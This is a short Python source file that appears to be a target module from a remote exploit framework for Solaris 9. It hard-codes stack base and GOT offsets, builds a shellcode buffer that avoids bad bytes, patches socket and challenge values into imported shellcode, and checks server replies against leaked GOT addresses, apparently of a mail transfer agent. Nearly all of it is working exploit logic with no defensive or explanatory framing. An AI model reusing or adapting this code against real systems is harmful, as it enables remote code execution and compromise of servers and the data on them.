import solaris
import solaris9shellcode
import utils

class solaris9(solaris.solaris):
   def __init__(self, stackBase=0xfddf4000L):
      self.stackBase = stackBase

   version = "Solaris 9"
   l7Stack = -0x144	# offset to ptr to GOT from bottom of thread stack

   def buildShellcodeBuffer(self, target, challenge):
      stackBase = target.stackBase
      basePC = stackBase + target.bigBufOffset
      pc = basePC
      while (utils.intHasBadBytes(pc - 8, target.badBytes)):
         pc += 4
      socketLoc = stackBase + target.socketOffset
      solaris9shellcode.socket_offset = \
         utils.stringifyAddr(socketLoc - (pc + 8))
      solaris9shellcode.challenge = \
         utils.stringifyAddr(challenge);
      filler = utils.buildBuffer(pc - basePC, target.badBytes)
      shellcodeBuf = filler \
                     + solaris9shellcode.build()
      target.pc = pc
      return shellcodeBuf

   def validReply(self, target, reply, stackBase):
      got = utils.stringifyAddr(target.got[0])
      for i in target.got[1:]:
         got += utils.stringifyAddr(target.imtaBase + i)
      validResponse = got[0:13] + "\r\n"
      if (validResponse == reply):
         return True
      return False
